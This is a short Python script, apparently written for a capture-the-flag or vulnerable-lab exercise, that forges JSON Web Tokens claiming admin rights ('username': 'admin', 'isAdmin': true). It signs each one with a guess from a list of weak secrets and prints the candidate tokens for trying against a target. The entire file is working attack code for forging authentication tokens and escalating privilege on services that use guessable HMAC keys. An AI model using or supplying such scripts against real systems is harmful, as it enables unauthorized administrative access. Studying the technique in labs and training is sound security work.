#!/usr/bin/env python3
import base64
import hmac
import hashlib
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Header
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# Payload
payload = {
    "username": "admin",
    "isAdmin": True,
    "iat": 1754643801
}

# Encode header and payload
header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# Message to sign
message = f"{header_encoded}.{payload_encoded}"

# Extended list of secrets
secrets = [
    "confession", "confessions", "Confession", "Confessions", "CONFESSION",
    "graphql", "GraphQL", "GRAPHQL", "graphQL",
    "vulnerable", "vulnerability", "vuln",
    "hackme", "hackme3", "vulnmachines",
    "secret", "Secret", "SECRET", "s3cr3t",
    "password", "Password", "PASSWORD", "pass",
    "admin", "Admin", "ADMIN", "administrator",
    "123456", "12345", "1234567890",
    "key", "Key", "KEY", "secretkey",
    "jwt", "JWT", "token", "Token",
    "auth", "Auth", "AUTH", "authentication",
    "test", "Test", "TEST", "testing",
    "dev", "Dev", "DEV", "development",
    "prod", "production", "Production",
    "default", "Default", "DEFAULT",
    "super", "Super", "SUPER", "supersecret",
    "qwerty", "QWERTY", "asdf", "zxcv",
    "letmein", "welcome", "Welcome",
    "changeme", "change", "Change",
    "master", "Master", "MASTER",
    "root", "Root", "ROOT", "toor",
    "flag", "Flag", "FLAG", "ctf"
]

for secret in secrets:
    # Create signature
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    
    signature_encoded = base64url_encode(signature)
    
    # Complete JWT
    jwt_token = f"{message}.{signature_encoded}"
    
    print(f'tokens["{secret}"]="{jwt_token}"')